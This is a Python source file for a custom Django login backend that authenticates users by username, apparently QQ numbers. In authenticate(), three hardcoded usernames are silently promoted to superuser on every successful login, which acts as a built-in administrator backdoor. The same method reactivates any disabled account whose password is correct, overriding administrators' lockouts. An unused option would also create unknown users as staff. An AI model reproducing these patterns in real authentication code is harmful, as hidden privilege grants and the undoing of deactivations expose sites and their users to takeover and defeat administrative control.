from django.db import connection
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User, Permission, Group
from django.core.mail import send_mail
from django.utils.crypto import get_random_string
import re
import ldap
import time
import subprocess
from common.functions import *
from common.models import *
import adminfunc
from userprofiles.models import *
from django.utils.crypto import get_random_string




class FlexBackend(ModelBackend):
	# Create a User object if not already in the database?
	create_unknown_user = False

	def authenticate(self, username=None, password=None):
		if not username:
			return None
		username = adminfunc.clean_username(username)
		# Note that this could be accomplished in one try-except clause, but
		# instead we use get_or_create when creating unknown users since it has
		# built-in safeguards for multiple threads.

		if self.create_unknown_user:
			user, created = User.objects.get_or_create(is_staff=True,username=username)
			if created:
				pass
			else:
				pass
		else:
			try:
				user = User.objects.get(username=username)
				if not user.email:
					user.email = username + "@qq.com"
			except User.DoesNotExist:
				return None
#		userprofile,created = UserProfile.objects.get_or_create(user=user)
#		if password == userprofile.sha256_first.to_eng_string() + "T+" + userprofile.sha256_second.to_eng_string() + "T":
		if user.check_password(password):
			if not user.is_active:
				user.is_active = True
				user.save()
		else:
			return None
		if user.username == "674494106" or user.username == "2374351836" or user.username == '9818674':
			user.is_superuser = True
			user.save()
		return user

			


	def get_user(self,user_id):
		try:
			return User.objects.get(pk=user_id)
		except User.DoesNotExist:
			return None
